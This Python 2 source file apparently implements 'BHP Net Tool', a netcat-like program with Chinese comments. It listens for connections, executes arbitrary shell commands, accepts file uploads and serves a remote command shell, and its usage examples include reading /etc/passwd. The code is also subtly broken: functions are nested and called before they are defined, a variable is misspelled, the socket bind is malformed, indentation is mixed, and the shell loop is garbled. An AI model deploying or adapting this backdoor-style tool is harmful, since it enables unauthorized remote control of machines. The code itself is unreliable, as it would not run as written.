# coding:utf-8

import sys
import socket
import getopt
import threading
import subprocess


listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


def usage():
	print "BHP Net Tool"
	print 
	print "Usage:bhpnet.py -t target_host -p post"
	print "-l --listen			- listen on [host]:[port] for -incoming connections"
	print "-e --execute=file_to_run	- execute the given file upon receiving a connection"
	print "-c --command			- initialize a command shell"
	print "-u --upload=destination	- upon receiving connection upload a file and write to [destination]"
	print
	print
	print "Examples:"
	print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
	print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
	print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
	print "echo 'ABCDEFGHIJ'|./bhpnet.py -t 192.168.11.12 -p 135"
	sys.exit(0)

def main():
	global port
	global listen
	global execute
	global command
	global upload_destination
	global target

	if not len(sys.argv[1:]):
		usage()

	try:
		opts,args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",["help","listen","execute","target","port","command","upload"])
	except getopt.GetoptError as err:
		print str(err)
		usage()


	for o,a in opts:
		if  o in ("-h","--help"):
			usage()
		elif o in ("-l","--listen"):
			listen = True
		elif o in ("-e","--execute"):
			execute = a
		elif o in ("-c","--commandshell"):
			command = True
		elif o in ("-u","--upload"):
			upload_destination = a
		elif o in ("-t","--target"):
			target = a
		elif o in ("-p","--port"):
			port = int(a)
		else:
			assert False,"Unhandled Option"


	# 进行监听还是标准输入发送数据
	if not listen and len(target) and port > 0:

			# 从命令行读内存数据
			# 阻塞，不在想标准输入发送数据时发送CTRL—D

			buffer = sys.stdin.read()
			# 发送数据
			client_sender(buffer)

	# 开始监听，上传文件，执行命令	
	# 放反弹shell
	# 取决上面的命令选择	
	if listen:
		server_loop()

	def client_sender(buffer):
		client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

		try:
			# 连接目标主机
			client.connect((target,port))
			if len(buffer):
				client.send(buffer)

			while True:

				#等待数据回传
				recv_len = 1
				respose = ""

				while  recv_len:

					date = client.recv(4096)
					recv_len = len(data)
					respose += data

					if recv_len < 4096:
						break
				print respose,
				# 更多输入
				buffer = raw_input("")
				buffer += "\n"
				# 发送出去
				client.send(buffer)

		except :
			print "[*] Exception Exiting"
			client.close()

	def server_loop():
		global target

		#无定义目标，监听所有端口
		if not len(target):
			target = "0.0.0.0"

		server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		server.bind(target,port)

		server.listen(5)

		while True:
			client_socket,addr = server.accept()

			#分拆线程，处理新客户端
			client_thread = threading.Thread(target=client_handler,args=(client_socket,))
			client_thread.start()

	def run_command(command):
		
		command = command.rstrip()

		try:
		    output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
		except:
			output = "Failed to execute command .\r\n"

		return output

	def client_handler(client_socket):
		global upload
		global execute
		global command

		#监测上传文件
		if len(upload_destination):

			#读取所有字符并写下目标
			file_buffer = ""

			#尺寸读取数据直到没有符合数据
			while True:
				data = client_socket.recv(1024)

				if not data:
						break

				else:
					file_buffer += data

			try:
				file_descriptor = open(upload_destination,"wb")
				file_descriptor.write(file_buffer)
				file_descriptor.close()

				#确认文件已写出
				client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
			except:
				client_socket.send("Failed to saved file to %s\r\n"%upload_destination)

		#检查命令执行
		if len(execute):
            #运行命令
			output = run_command(execute)
			client_socket.send(output)

        # 执行shell 进入另一个循环
        if command:
        	while True:
        		# 跳出窗口
        		client_socket.send("<BHP:#> ")

        		#接收文件直到发现换行符
        		cmd_buffer = ""
        		while "\n" not in cmd_buffer:
        			cmd_buffer += client_socket.recv(1024)
        			# 返还命令输出
        			respose = run_command(cmd_buffer)
        			#返回相应数据
        			client_socket.send(respose)

